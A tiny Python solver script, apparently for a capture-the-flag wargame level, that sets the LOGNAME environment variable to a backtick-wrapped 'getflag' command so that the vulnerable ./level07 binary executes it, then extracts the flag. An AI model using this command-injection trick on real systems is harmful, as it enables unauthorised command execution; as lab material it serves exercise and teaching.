from solver.utils import extract_flag

def solve(connection):
	flag = connection.exec("export LOGNAME='`getflag`' && ./level07")
	return "", extract_flag(flag)